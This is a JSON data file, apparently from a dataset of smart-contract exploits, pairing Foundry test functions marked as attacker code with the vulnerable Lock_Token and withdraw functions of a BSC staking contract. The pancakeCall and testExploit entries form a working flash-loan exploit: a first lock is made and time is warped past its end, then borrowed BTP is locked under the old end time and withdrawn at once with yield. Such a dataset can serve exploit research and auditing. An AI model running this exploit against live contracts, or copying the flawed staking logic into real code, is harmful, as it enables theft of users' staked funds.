[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        BTP.approve(address(Staking), type(uint256).max);\n        Staking.Lock_Token(1, BTP.balanceOf(address(this)));\n        Staking.withdraw(1);\n        BTP.transfer(msg.sender, flashAmount * 10_000 / 9975 + 1000);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_176_675);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        firstLock();\n\n        cheats.warp(block.timestamp + 6 * 30 * 24 * 60 * 60 + 1000); // lock 6 month\n\n        Pair.swap(flashAmount, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"Attacker BTP balance after exploit\", BTP.balanceOf(address(this)), BTP.decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IStaking",
    "source_type": "victim_contract",
    "function_name": "Lock_Token",
    "original_code": "    function Lock_Token(uint256 plan, uint256 _amount) external {\n      if(plan == 1) {\n          address contractAddress = address(this);\n          uint256 currentAmount = sixMonth[msg.sender].amount;\n          uint256 total = SafeMath.add(currentAmount,_amount);\n          if(sixMonth[msg.sender].reinvest == 0) {\n          uint256 startTime = block.timestamp;\n          uint256 endTime = block.timestamp + 180 days;\n          sixMonth[msg.sender] = TimeLock_Six_Month(msg.sender,total,startTime,endTime,1);\n          }\n          else {\n              uint256 startTime = sixMonth[msg.sender].start_time;\n              uint256 endTime = sixMonth[msg.sender].end_time;\n              sixMonth[msg.sender] = TimeLock_Six_Month(msg.sender,total,startTime,endTime,1);\n          }\n          ERC20interface.transferFrom(msg.sender, contractAddress, _amount);\n      }\n      else if(plan == 2) {\n          address contractAddress = address(this);\n          uint256 currentAmount = nineMonth[msg.sender].amount;\n          uint256 total = SafeMath.add(currentAmount,_amount);\n           if(nineMonth[msg.sender].reinvest == 0) {\n          uint256 startTime = block.timestamp;\n          uint256 endTime = block.timestamp + 270 days;\n          nineMonth[msg.sender] = TimeLock_Nine_Month(msg.sender,total,startTime,endTime,1);\n           }\n           else {\n              uint256 startTime = nineMonth[msg.sender].start_time;\n              uint256 endTime = nineMonth[msg.sender].end_time;\n              nineMonth[msg.sender] = TimeLock_Nine_Month(msg.sender,total,startTime,endTime,1);\n           }\n          ERC20interface.transferFrom(msg.sender, contractAddress, _amount);\n      }\n      else if(plan == 3) {\n          address contractAddress = address(this);\n          uint256 currentAmount = twelveMonth[msg.sender].amount;\n          uint256 total = SafeMath.add(currentAmount,_amount);\n          if(twelveMonth[msg.sender].reinvest == 0) {\n          uint256 startTime = block.timestamp;\n          uint256 endTime = block.timestamp + 365 days;\n          twelveMonth[msg.sender] = TimeLock_Twelve_Month(msg.sender,total,startTime,endTime,1);\n          }\n          else {\n              uint256 startTime = twelveMonth[msg.sender].start_time;\n              uint256 endTime = twelveMonth[msg.sender].end_time;\n              twelveMonth[msg.sender] = TimeLock_Twelve_Month(msg.sender,total,startTime,endTime,1);\n          }\n          ERC20interface.transferFrom(msg.sender, contractAddress, _amount);\n      }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IStaking",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint256 _plan) public {\n        if(_plan == 1) {\n        require(block.timestamp >= sixMonth[msg.sender].end_time, \"You cant unstake now\");\n        uint256 roi = sixMonth[msg.sender].amount;\n        uint256 RoiReturn = plan_1_Roi(roi);\n        uint256 investedAmount = sixMonth[msg.sender].amount;\n        uint256 total = SafeMath.add(RoiReturn,investedAmount);\n        ERC20interface.transfer(msg.sender, total);\n\n        sixMonth[msg.sender] = TimeLock_Six_Month(msg.sender,0,0,0,0);\n         }\n\n        else if(_plan == 2) {\n        require(block.timestamp >= nineMonth[msg.sender].end_time, \"You cant unstake now\");\n        uint256 roi = nineMonth[msg.sender].amount;\n        uint256 RoiReturn = plan_2_Roi(roi);\n        uint256 investedAmount = nineMonth[msg.sender].amount;\n        uint256 total = SafeMath.add(RoiReturn,investedAmount);\n        ERC20interface.transfer(msg.sender, total);\n        nineMonth[msg.sender] = TimeLock_Nine_Month(msg.sender,0,0,0,0);\n         }\n\n         else if(_plan == 3) {\n        require(block.timestamp >= twelveMonth[msg.sender].end_time, \"You cant unstake now\");\n        uint256 roi = twelveMonth[msg.sender].amount;\n        uint256 RoiReturn = plan_3_Roi(roi);\n        uint256 investedAmount = twelveMonth[msg.sender].amount;\n        uint256 total = SafeMath.add(RoiReturn,investedAmount);\n        ERC20interface.transfer(msg.sender, total);\n\n        twelveMonth[msg.sender] = TimeLock_Twelve_Month(msg.sender,0,0,0,0);\n         }\n    }\n\n",
    "description": ""
  }
]